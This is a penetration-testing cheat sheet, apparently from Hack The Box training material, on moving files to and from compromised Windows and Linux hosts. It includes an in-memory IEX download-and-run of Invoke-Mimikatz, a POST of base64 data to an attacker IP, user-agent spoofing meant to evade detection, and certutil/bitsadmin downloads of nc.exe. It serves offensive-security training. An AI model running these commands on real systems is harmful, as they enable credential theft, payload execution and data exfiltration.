---
title: "File Transfers"
description: "Move files to/from targets on Windows/Linux: HTTP, SMB, certutil, base64, nc and living-off-the-land."
category: tools
tags: [post-exploitation, file-transfer, windows, linux]
tools: [certutil, wget, nc, smbserver]
difficulty: intermediate
updated: "2026-08-09"
source: "repo:HTB/cheatsheet-file-transfers.pdf"
---

# File Transfers

Quick reference for moving files to and from a target during an engagement, using built-in / living-off-the-land utilities on Windows and Linux. Replace `10.10.10.32` / `<snip>` with your attacker host and hosted-file URL.

---

## Windows — PowerShell

```powershell
# Download a file with PowerShell
Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1

# Execute a file in memory (no disk write)
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')

# Upload a file with PowerShell (POST body)
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64

# Download with a Chrome User-Agent (blend in with normal traffic)
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
```

---

## Windows — Living Off The Land Binaries

```powershell
# Download using Bitsadmin
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe

# Download using Certutil
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

---

## Linux

```bash
# Download using wget
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

# Download using cURL
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Download using PHP
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

---

## SCP (SSH)

```bash
# Upload a file to a target
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip

# Download a file from a target
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```
